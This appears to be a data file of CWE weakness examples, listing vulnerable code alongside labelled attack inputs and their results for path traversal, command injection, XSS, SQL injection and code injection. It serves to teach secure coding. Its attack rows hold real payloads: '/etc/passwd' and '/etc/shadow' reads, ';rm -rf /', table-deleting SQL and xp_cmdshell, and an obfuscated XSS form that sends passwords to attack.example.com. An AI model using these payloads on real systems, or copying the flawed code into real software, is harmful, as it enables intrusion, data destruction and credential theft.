5,
6,"
example: 1
NATURE:bad:
LANGUAGE:XML:
                  
<sun-web-app>
...
<session-config>
<session-properties>
<property name=""idLengthBytes"" value=""8"">
<description>The number of bytes in this web module's session ID.</description>
</property>
</session-properties>
</session-config>
...
</sun-web-app>

               "
7,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
Public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
try {
...
} catch (ApplicationSpecificException ase) {
logger.error(""Caught: "" + ase.toString());
}
}

               "
8,"
example: 1
NATURE:bad:
LANGUAGE:XML:
                  
<ejb-jar>
<enterprise-beans>
<entity>
<ejb-name>EmployeeRecord</ejb-name>
<home>com.wombat.empl.EmployeeRecordHome</home>
<remote>com.wombat.empl.EmployeeRecord</remote>
...
</entity>
...
</enterprise-beans>
</ejb-jar>

               "
9,"
example: 1
NATURE:bad:
LANGUAGE:XML:
                  
<ejb-jar>
...
<assembly-descriptor>
<method-permission>
<role-name>ANYONE</role-name>
<method>
<ejb-name>Employee</ejb-name>
<method-name>getSalary</method-name>
</method-permission>
</assembly-descriptor>
...
</ejb-jar>

               "
11,"
example: 1
NATURE:bad:
LANGUAGE:XML:
                  
<?xml version=""1.0"" encoding=""utf-8"" ?>
<configuration>
<system.web>
<compilation
defaultLanguage=""c#""
debug=""true""
/>
...
</system.web>
</configuration>

               "
12,"
example: 1
NATURE:bad:
LANGUAGE:ASP.NET:
                  
<customErrors mode=""Off"" />

               
example: 2
NATURE:good:
LANGUAGE:ASP.NET:
                  
<customErrors mode=""RemoteOnly"" />

               
example: 3
NATURE:good:
LANGUAGE:ASP.NET:
                  
<customErrors mode=""On"" defaultRedirect=""YourErrorPage.htm"" />

               "
13,"
example: 1
NATURE:bad:
LANGUAGE:ASP.NET:
                  
...
<connectionStrings>
<add name=""ud_DEV"" connectionString=""connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;"" providerName=""System.Data.Odbc"" />
</connectionStrings>
...

               "
14,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
void GetData(char *MFAddr) {

                        
char pwd[64];
if (GetPasswordFromUser(pwd, sizeof(pwd))) {

                              

                                 
if (ConnectToMainframe(MFAddr, pwd)) {

                                    

                                       

                                       
// Interaction with mainframe

                                       

                                    

                                 
}

                           
}
memset(pwd, 0, sizeof(pwd));

                     
}

               "
15,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
...
sethostid(argv[1]);
...

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
...
conn.setCatalog(request.getParameter(""catalog""));
...

               "
20,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
...
public static final double price = 20.00;
int quantity = currentUser.getAttribute(""quantity"");
double total = price * quantity;
chargeUser(total);
...

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
...
#define MAX_DIM 100
...

                     
/* board dimensions */

                     

                     
int m,n, error;
board_square_t *board;
printf(""Please specify the board height: \n"");
error = scanf(""%d"", &m);
if ( EOF == error ){
die(""No integer passed: Die evil hacker!\n"");
}
printf(""Please specify the board width: \n"");
error = scanf(""%d"", &n);
if ( EOF == error ){
die(""No integer passed: Die evil hacker!\n"");
}
if ( m > MAX_DIM || n > MAX_DIM ) {
die(""Value too large: Die evil hacker!\n"");
}
board = (board_square_t*) malloc( m * n * sizeof(board_square_t));
...

               
example: 3
NATURE:bad:
LANGUAGE:PHP:
                  
$birthday = $_GET['birthday'];
$homepage = $_GET['homepage'];
echo ""Birthday: $birthday<br>Homepage: <a href=$homepage>click here</a>""

               
example: 4
NATURE:attack:
                  
2009-01-09--

               
example: 5
NATURE:bad:
LANGUAGE:C:
                  
void parse_data(char *untrusted_input){

                        
int m, n, error;
error = sscanf(untrusted_input, ""%d:%d"", &m, &n);
if ( EOF == error ){
die(""Did not specify integer value. Die evil hacker!\n"");
}

                           
/* proceed assuming n and m are initialized correctly */

                           

                        

                     
}

               
example: 6
NATURE:attack:
                  
123:

               
example: 7
NATURE:bad:
LANGUAGE:Java:
                  
private void buildList ( int untrustedListSize ){
if ( 0 > untrustedListSize ){
die(""Negative value supplied for list size, die evil hacker!"");
}
Widget[] list = new Widget [ untrustedListSize ];
list[0] = new Widget();
}

               
example: 8
NATURE:bad:
LANGUAGE:Java:
                  

                     

                     
...

                     
IntentFilter filter = new IntentFilter(""com.example.URLHandler.openURL"");
MyReceiver receiver = new MyReceiver();
registerReceiver(receiver, filter);

                     
...

                     

                     
public class UrlHandlerReceiver extends BroadcastReceiver {

                        
@Override
public void onReceive(Context context, Intent intent) {

                              
if(""com.example.URLHandler.openURL"".equals(intent.getAction())) {
String URL = intent.getStringExtra(""URLToOpen"");
int length = URL.length();

                                 

                                 
...

                                 
}

                           
}

                     
}

               "
22,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
my $dataPath = ""/users/cwe/profiles"";
my $username = param(""user"");
my $profilePath = $dataPath . ""/"" . $username;

                     
open(my $fh, ""<$profilePath"") || ExitError(""profile read error: $profilePath"");
print ""<ul>\n"";
while (<$fh>) {
print ""<li>$_</li>\n"";
}
print ""</ul>\n"";

               
example: 2
NATURE:attack:
                  
../../../etc/passwd

               
example: 3
NATURE:result:
                  
/users/cwe/profiles/../../../etc/passwd

               
example: 4
NATURE:result:
                  
/etc/passwd

               
example: 5
NATURE:bad:
LANGUAGE:Java:
                  
String filename = System.getProperty(""com.domain.application.dictionaryFile"");
File dictionaryFile = new File(filename);

               
example: 6
NATURE:bad:
LANGUAGE:Perl:
                  
my $Username = GetUntrustedInput();
$Username =~ s/\.\.\///;
my $filename = ""/home/user/"" . $Username;
ReadAndSendFile($filename);

               
example: 7
NATURE:attack:
                  
../../../etc/passwd

               
example: 8
NATURE:result:
                  
../../etc/passwd

               
example: 9
NATURE:result:
                  
/home/user/../../etc/passwd

               
example: 10
NATURE:bad:
LANGUAGE:Java:
                  
String path = getInputPath();
if (path.startsWith(""/safe_dir/""))
{
File f = new File(path);
f.delete()
}

               
example: 11
NATURE:attack:
                  
/safe_dir/../important.dat

               
example: 12
NATURE:good:
LANGUAGE:HTML:
                  
<form action=""FileUploadServlet"" method=""post"" enctype=""multipart/form-data"">

                        
Choose a file to upload:

                        
<input type=""file"" name=""filename""/>
<br/>
<input type=""submit"" name=""submit"" value=""Submit""/>

                     
</form>

               
example: 13
NATURE:bad:
LANGUAGE:Java:
                  
public class FileUploadServlet extends HttpServlet {

                        
...

                        
protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
response.setContentType(""text/html"");
PrintWriter out = response.getWriter();
String contentType = request.getContentType();

                           

                           
// the starting position of the boundary header

                           
int ind = contentType.indexOf(""boundary="");
String boundary = contentType.substring(ind+9);

                           
String pLine = new String();
String uploadLocation = new String(UPLOAD_DIRECTORY_STRING); //Constant value

                           

                           
// verify that content type is multipart form data

                           
if (contentType != null && contentType.indexOf(""multipart/form-data"") != -1) {

                              
// extract the filename from the Http header
BufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));
...
pLine = br.readLine();
String filename = pLine.substring(pLine.lastIndexOf(""\\""), pLine.lastIndexOf(""\""""));
...

                              

                              
// output the file to the local upload directory

                              
try {
BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));
for (String line; (line=br.readLine())!=null; ) {
if (line.indexOf(boundary) == -1) {
bw.write(line);
bw.newLine();
bw.flush();
}
} //end of for loop
bw.close();
} catch (IOException ex) {...}

                              

                              
// output successful upload response HTML page

                              

                              

                           
}

                           
// output unsuccessful upload response HTML page

                           
else
{...}
}

                           
...

                        

                     
}

               "
23,"
example: 1
NATURE:bad:
                  
http://example.com.br/get-files.jsp?file=report.pdf
http://example.com.br/get-page.php?home=aaa.html
http://example.com.br/some-page.asp?page=index.html

               
example: 2
NATURE:attack:
                  
http://example.com.br/get-files?file=../../../../somedir/somefile
http://example.com.br/../../../../etc/shadow
http://example.com.br/get-files?file=../../../../etc/passwd

               
example: 3
NATURE:bad:
LANGUAGE:Perl:
                  
my $dataPath = ""/users/cwe/profiles"";
my $username = param(""user"");
my $profilePath = $dataPath . ""/"" . $username;

                     
open(my $fh, ""<$profilePath"") || ExitError(""profile read error: $profilePath"");
print ""<ul>\n"";
while (<$fh>) {
print ""<li>$_</li>\n"";
}
print ""</ul>\n"";

               
example: 4
NATURE:attack:
                  
../../../etc/passwd

               
example: 5
NATURE:result:
                  
/users/cwe/profiles/../../../etc/passwd

               
example: 6
NATURE:result:
                  
/etc/passwd

               
example: 7
NATURE:good:
LANGUAGE:HTML:
                  
<form action=""FileUploadServlet"" method=""post"" enctype=""multipart/form-data"">

                     
Choose a file to upload:
<input type=""file"" name=""filename""/>
<br/>
<input type=""submit"" name=""submit"" value=""Submit""/>

                     
</form>

               
example: 8
NATURE:bad:
LANGUAGE:Java:
                  
public class FileUploadServlet extends HttpServlet {

                     

                        
...

                           
protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

                           

                              
response.setContentType(""text/html"");
PrintWriter out = response.getWriter();
String contentType = request.getContentType();

                                 
// the starting position of the boundary header
int ind = contentType.indexOf(""boundary="");
String boundary = contentType.substring(ind+9);

                                 
String pLine = new String();
String uploadLocation = new String(UPLOAD_DIRECTORY_STRING); //Constant value

                                 
// verify that content type is multipart form data
if (contentType != null && contentType.indexOf(""multipart/form-data"") != -1) {

                                 

                                    
// extract the filename from the Http header
BufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));
...
pLine = br.readLine();
String filename = pLine.substring(pLine.lastIndexOf(""\\""), pLine.lastIndexOf(""\""""));
...

                                       
// output the file to the local upload directory
try {

                                          
BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));
for (String line; (line=br.readLine())!=null; ) {
if (line.indexOf(boundary) == -1) {
bw.write(line);
bw.newLine();
bw.flush();
}
} //end of for loop
bw.close();

                                       

                                       

                                       
} catch (IOException ex) {...}
// output successful upload response HTML page

                                 
}
// output unsuccessful upload response HTML page
else
{...}

                           
}
...

                        

                     
}

               "
24,
25,
26,
27,
28,
29,
30,
31,
32,
33,
34,
35,
36,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
String filename = System.getProperty(""com.domain.application.dictionaryFile"");
File dictionaryFile = new File(filename);

               
example: 2
NATURE:good:
LANGUAGE:HTML:
                  
<form action=""FileUploadServlet"" method=""post"" enctype=""multipart/form-data"">

                     
Choose a file to upload:
<input type=""file"" name=""filename""/>
<br/>
<input type=""submit"" name=""submit"" value=""Submit""/>

                     
</form>

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
public class FileUploadServlet extends HttpServlet {

                     

                        
...

                           
protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

                           

                              
response.setContentType(""text/html"");
PrintWriter out = response.getWriter();
String contentType = request.getContentType();

                                 
// the starting position of the boundary header
int ind = contentType.indexOf(""boundary="");
String boundary = contentType.substring(ind+9);

                                 
String pLine = new String();
String uploadLocation = new String(UPLOAD_DIRECTORY_STRING); //Constant value

                                 
// verify that content type is multipart form data
if (contentType != null && contentType.indexOf(""multipart/form-data"") != -1) {

                                 

                                    
// extract the filename from the Http header
BufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));
...
pLine = br.readLine();
String filename = pLine.substring(pLine.lastIndexOf(""\\""), pLine.lastIndexOf(""\""""));
...

                                       
// output the file to the local upload directory
try {

                                          
BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));
for (String line; (line=br.readLine())!=null; ) {
if (line.indexOf(boundary) == -1) {
bw.write(line);
bw.newLine();
bw.flush();
}
} //end of for loop
bw.close();

                                       

                                       

                                       
} catch (IOException ex) {...}
// output successful upload response HTML page

                                 
}
// output unsuccessful upload response HTML page
else
{...}

                           
}
...

                        

                     
}

               "
37,
38,
39,
40,
41,
42,
43,
44,
45,
46,
47,
48,
49,
50,
51,
52,
53,
54,
55,
56,
57,
58,
59,
61,
62,
64,
65,
66,
67,
69,
72,
73,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
String rName = request.getParameter(""reportName"");
File rFile = new File(""/usr/local/apfr/reports/"" + rName);
...
rFile.delete();

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
fis = new FileInputStream(cfg.getProperty(""sub"")+"".txt"");
amt = fis.read(arr);
out.println(arr);

               "
74,
75,
76,
77,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
int main(int argc, char** argv) {
char cmd[CMD_MAX] = ""/usr/bin/cat "";
strcat(cmd, argv[1]);
system(cmd);
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
...
String btype = request.getParameter(""backuptype"");
String cmd = new String(""cmd.exe /K \""
c:\\util\\rmanDB.bat ""
+btype+
""&&c:\\utl\\cleanup.bat\"""")

                     
System.Runtime.getRuntime().exec(cmd);
...

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
...
String home = System.getProperty(""APPHOME"");
String cmd = home + INITCMD;
java.lang.Runtime.getRuntime().exec(cmd);
...

               
example: 4
NATURE:bad:
LANGUAGE:C:
                  
#include <stdio.h>
#include <unistd.h>

                     
int main(int argc, char **argv) {

                        

                           
char cat[] = ""cat "";
char *command;
size_t commandLength;

                           
commandLength = strlen(cat) + strlen(argv[1]) + 1;
command = (char *) malloc(commandLength);
strncpy(command, cat, commandLength);
strncat(command, argv[1], (commandLength - strlen(cat)) );

                           
system(command);
return (0);

                     
}

               
example: 5
NATURE:informative:
                  
$ ./catWrapper Story.txt
When last we left our heroes...

               
example: 6
NATURE:attack:
                  
$ ./catWrapper Story.txt; ls
When last we left our heroes...
Story.txt
SensitiveFile.txt
PrivateData.db
a.out*

               "
78,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
$userName = $_POST[""user""];
$command = 'ls -l /home/' . $userName;
system($command);

               
example: 2
NATURE:attack:
                  
;rm -rf /

               
example: 3
NATURE:result:
                  
ls -l /home/;rm -rf /

               
example: 4
NATURE:bad:
LANGUAGE:Perl:
                  
use CGI qw(:standard);
$name = param('name');
$nslookup = ""/path/to/nslookup"";
print header;
if (open($fh, ""$nslookup $name|"")) {
while (<$fh>) {
print escapeHTML($_);
print ""<br>\n"";
}
close($fh);
}

               
example: 5
NATURE:attack:
                  
cwe.mitre.org%20%3B%20/bin/ls%20-l

               
example: 6
NATURE:result:
                  
/path/to/nslookup cwe.mitre.org ; /bin/ls -l

               
example: 7
NATURE:bad:
LANGUAGE:Java:
                  
String script = System.getProperty(""SCRIPTNAME"");
if (script != null)
System.exec(script);

                  

               
example: 8
NATURE:bad:
LANGUAGE:Java:
                  
public String coordinateTransformLatLonToUTM(String coordinates)
{

                        
String utmCoords = null;
try {

                              
String latlonCoords = coordinates;
Runtime rt = Runtime.getRuntime();
Process exec = rt.exec(""cmd.exe /C latlon2utm.exe -"" + latlonCoords);

                                 
// process results of coordinate transform

                                 

                                 

                                 
// ...

                                 

                              

                           
}
catch(Exception e) {...}
return utmCoords;

                     
}

               
example: 9
NATURE:bad:
LANGUAGE:Java:
                  
...
String btype = request.getParameter(""backuptype"");
String cmd = new String(""cmd.exe /K \""
c:\\util\\rmanDB.bat ""
+btype+
""&&c:\\utl\\cleanup.bat\"""")

                     
System.Runtime.getRuntime().exec(cmd);
...

               "
79,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
$username = $_GET['username'];
echo '<div class=""header""> Welcome, ' . $username . '</div>';

               
example: 2
NATURE:attack:
                  
http://trustedSite.example.com/welcome.php?username=<Script Language=""Javascript"">alert(""You've been attacked!"");</Script>

               
example: 3
NATURE:attack:
                  
http://trustedSite.example.com/welcome.php?username=<div id=""stealPassword"">Please Login:<form name=""input"" action=""http://attack.example.com/stealPassword.php"" method=""post"">Username: <input type=""text"" name=""username"" /><br/>Password: <input type=""password"" name=""password"" /><br/><input type=""submit"" value=""Login"" /></form></div>

               
example: 4
NATURE:result:
                  
<div class=""header""> Welcome, <div id=""stealPassword""> Please Login:

                        
<form name=""input"" action=""attack.example.com/stealPassword.php"" method=""post"">
Username: <input type=""text"" name=""username"" /><br/>
Password: <input type=""password"" name=""password"" /><br/>
<input type=""submit"" value=""Login"" />
</form>

                     
</div></div>

               
example: 5
NATURE:attack:
                  
trustedSite.example.com/welcome.php?username=%3Cdiv+id%3D%22
stealPassword%22%3EPlease+Login%3A%3Cform+name%3D%22input
%22+action%3D%22http%3A%2F%2Fattack.example.com%2FstealPassword.php
%22+method%3D%22post%22%3EUsername%3A+%3Cinput+type%3D%22text
%22+name%3D%22username%22+%2F%3E%3Cbr%2F%3EPassword%3A
+%3Cinput+type%3D%22password%22+name%3D%22password%22
+%2F%3E%3Cinput+type%3D%22submit%22+value%3D%22Login%22
+%2F%3E%3C%2Fform%3E%3C%2Fdiv%3E%0D%0A

               
example: 6
NATURE:attack:
                  
trustedSite.example.com/welcome.php?username=<script+type=""text/javascript"">
document.write('\u003C\u0064\u0069\u0076\u0020\u0069\u0064\u003D\u0022\u0073
\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064
\u0022\u003E\u0050\u006C\u0065\u0061\u0073\u0065\u0020\u004C\u006F\u0067
\u0069\u006E\u003A\u003C\u0066\u006F\u0072\u006D\u0020\u006E\u0061\u006D
\u0065\u003D\u0022\u0069\u006E\u0070\u0075\u0074\u0022\u0020\u0061\u0063
\u0074\u0069\u006F\u006E\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F
\u002F\u0061\u0074\u0074\u0061\u0063\u006B\u002E\u0065\u0078\u0061\u006D
\u0070\u006C\u0065\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0065\u0061
\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u002E\u0070\u0068
\u0070\u0022\u0020\u006D\u0065\u0074\u0068\u006F\u0064\u003D\u0022\u0070
\u006F\u0073\u0074\u0022\u003E\u0055\u0073\u0065\u0072\u006E\u0061\u006D
\u0065\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079
\u0070\u0065\u003D\u0022\u0074\u0065\u0078\u0074\u0022\u0020\u006E\u0061
\u006D\u0065\u003D\u0022\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065
\u0022\u0020\u002F\u003E\u003C\u0062\u0072\u002F\u003E\u0050\u0061\u0073
\u0073\u0077\u006F\u0072\u0064\u003A\u0020\u003C\u0069\u006E\u0070\u0075
\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0070\u0061\u0073\u0073
\u0077\u006F\u0072\u0064\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022
\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u002F\u003E
\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D
\u0022\u0073\u0075\u0062\u006D\u0069\u0074\u0022\u0020\u0076\u0061\u006C
\u0075\u0065\u003D\u0022\u004C\u006F\u0067\u0069\u006E\u0022\u0020\u002F
\u003E\u003C\u002F\u0066\u006F\u0072\u006D\u003E\u003C\u002F\u0064\u0069\u0076\u003E\u000D');</script>

               
example: 7
NATURE:bad:
LANGUAGE:JSP:
                  
<% String eid = request.getParameter(""eid""); %>
...
Employee ID: <%= eid %>

               
example: 8
NATURE:bad:
LANGUAGE:ASP.NET:
                  
<%
protected System.Web.UI.WebControls.TextBox Login;
protected System.Web.UI.WebControls.Label EmployeeID;
...
EmployeeID.Text = Login.Text;
%>

                     
<p><asp:label id=""EmployeeID"" runat=""server"" /></p>

               
example: 9
NATURE:bad:
LANGUAGE:JSP:
                  
<%Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid);
if (rs != null) {
rs.next();
String name = rs.getString(""name"");
}%>

                     
Employee Name: <%= name %>

               
example: 10
NATURE:bad:
LANGUAGE:ASP.NET:
                  
<%
protected System.Web.UI.WebControls.Label EmployeeName;
...
string query = ""select * from emp where id="" + eid;
sda = new SqlDataAdapter(query, conn);
sda.Fill(dt);
string name = dt.Rows[0][""Name""];
...
EmployeeName.Text = name;%>
<p><asp:label id=""EmployeeName"" runat=""server"" /></p>

               
example: 11
NATURE:bad:
LANGUAGE:PHP:
                  
$username = mysql_real_escape_string($username);
$fullName = mysql_real_escape_string($fullName);
$query = sprintf('Insert Into users (username,password) Values (""%s"",""%s"",""%s"")', $username, crypt($password),$fullName) ;
mysql_query($query);
/.../

               
example: 12
NATURE:bad:
LANGUAGE:PHP:
                  
$query = 'Select * From users Where loggedIn=true';
$results = mysql_query($query);

                     
if (!$results) {
exit;
}

                     

                     
//Print list of users to page

                     
echo '<div id=""userlist"">Currently Active Users:';
while ($row = mysql_fetch_assoc($results)) {
echo '<div class=""userNames"">'.$row['fullname'].'</div>';
}
echo '</div>';

               
example: 13
NATURE:bad:
LANGUAGE:PHP:
                  
$name = $_COOKIE[""myname""];
$announceStr = ""$name just logged in."";

                     

                     
//save HTML-formatted message to file; implementation details are irrelevant for this example.

                     

				saveMessage($announceStr);

               
example: 14
NATURE:attack:
                  
<script>document.alert('Hacked');</script>

               
example: 15
NATURE:result:
                  
<script>document.alert('Hacked');</script> has logged in.

               "
80,"
example: 1
NATURE:bad:
LANGUAGE:JSP:
                  
<% for (Iterator i = guestbook.iterator(); i.hasNext(); ) {
Entry e = (Entry) i.next(); %>
<p>Entry #<%= e.getId() %></p>
<p><%= e.getText() %></p>
<%
} %>

                  

               "
81,
82,
83,
84,
85,
86,
87,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public String preventXSS(String input, String mask) {
return input.replaceAll(""script"", mask);
}

               "
88,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
int main(int argc, char** argv) {
char cmd[CMD_MAX] = ""/usr/bin/cat "";
strcat(cmd, argv[1]);
system(cmd);
}

               "
89,"
example: 1
NATURE:bad:
LANGUAGE:C#:
                  
...
string userName = ctx.getAuthenticatedUserName();
string query = ""SELECT * FROM items WHERE owner = '"" + userName + ""' AND itemname = '"" + ItemName.Text + ""'"";
sda = new SqlDataAdapter(query, conn);
DataTable dt = new DataTable();
sda.Fill(dt);
...

               
example: 2
NATURE:informative:
                  
SELECT * FROM items WHERE owner = <userName> AND itemname = <itemName>;

               
example: 3
NATURE:attack:
                  
name' OR 'a'='a

               
example: 4
NATURE:attack:
                  
SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name' OR 'a'='a';

               
example: 5
NATURE:attack:
                  
OR 'a'='a

               
example: 6
NATURE:attack:
                  
SELECT * FROM items;

               
example: 7
NATURE:attack:
                  
name'; DELETE FROM items; --

               
example: 8
NATURE:attack:
LANGUAGE:SQL:
                  
SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name';
DELETE FROM items;

                     
--'

                     

                  

               
example: 9
NATURE:attack:
                  
name'; DELETE FROM items; SELECT * FROM items WHERE 'a'='a

               
example: 10
NATURE:attack:
                  
SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name';
DELETE FROM items;
SELECT * FROM items WHERE 'a'='a';

               
example: 11
NATURE:bad:
                  
procedure get_item ( itm_cv IN OUT ItmCurTyp, usr in varchar2, itm in varchar2)
is open itm_cv for
' SELECT * FROM items WHERE ' || 'owner = '|| usr || ' AND itemname = ' || itm || ';
end get_item;

               
example: 12
NATURE:bad:
                  
SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='$user_input' ORDER BY PRICE

               
example: 13
NATURE:attack:
                  
'; exec master..xp_cmdshell 'dir' --

               
example: 14
NATURE:attack:
                  
SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=''; exec master..xp_cmdshell 'dir' --' ORDER BY PRICE

               
example: 15
NATURE:bad:
LANGUAGE:PHP:
                  
$id = $_COOKIE[""mid""];
mysql_query(""SELECT MessageID, Subject FROM messages WHERE MessageID = '$id'"");

               
example: 16
NATURE:attack:
                  
1432' or '1' = '1

               
example: 17
NATURE:result:
                  
SELECT MessageID, Subject FROM messages WHERE MessageID = '1432' or '1' = '1'

               
example: 18
NATURE:good:
LANGUAGE:PHP:
                  
$id = intval($_COOKIE[""mid""]);
mysql_query(""SELECT MessageID, Subject FROM messages WHERE MessageID = '$id'"");

               
example: 19
NATURE:bad:
LANGUAGE:Perl:
                  
$userKey = getUserID();
$name = getUserInput();

                     

                     
# ensure only letters, hyphens and apostrophe are allowed

                     
$name = whiteList($name, ""^a-zA-z'-$"");
$query = ""INSERT INTO last_names VALUES('$userKey', '$name')"";

               "
90,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
context = new InitialDirContext(env);
String searchFilter = ""StreetAddress="" + address;
NamingEnumeration answer = context.search(searchBase, searchFilter, searchCtls);

               "
91,
93,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
logger.info(""User's street address: "" + request.getParameter(""streetAddress""));

               "
94,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
$MessageFile = ""cwe-94/messages.out"";
if ($_GET[""action""] == ""NewMessage"") {
$name = $_GET[""name""];
$message = $_GET[""message""];
$handle = fopen($MessageFile, ""a+"");
fwrite($handle, ""<b>$name</b> says '$message'<hr>\n"");
fclose($handle);
echo ""Message Saved!<p>\n"";
}
else if ($_GET[""action""] == ""ViewMessages"") {
include($MessageFile);
}

               
example: 2
NATURE:attack:
                  
name=h4x0r
message=%3C?php%20system(%22/bin/ls%20-l%22);?%3E

               
example: 3
NATURE:attack:
                  
<?php system(""/bin/ls -l"");?>

               
example: 4
NATURE:bad:
LANGUAGE:Perl:
                  
use CGI qw(:standard);

                     
sub config_file_add_key {

                        
my ($fname, $key, $arg) = @_;

                           

                           
# code to add a field/key to a file goes here

                           

                        

                     
}

                     
sub config_file_set_key {

                        
my ($fname, $key, $arg) = @_;

                           

                           
# code to set key to a particular file goes here

                           

                        

                     
}

                     
sub config_file_delete_key {

                        
my ($fname, $key, $arg) = @_;

                           

                           
# code to delete key from a particular file goes here

                           

                        

                     
}

                     
sub handleConfigAction {

                        
my ($fname, $action) = @_;
my $key = param('key');
my $val = param('val');

                           

                           
# this is super-efficient code, especially if you have to invoke

                           

                           

                           

                           
# any one of dozens of different functions!

                           

                           
my $code = ""config_file_$action_key(\$fname, \$key, \$val);"";
eval($code);

                     
}

                     
$configfile = ""/home/cwe/config.txt"";
print header;
if (defined(param('action'))) {
handleConfigAction($configfile, param('action'));
}
else {
print ""No action specified!\n"";
}

               "
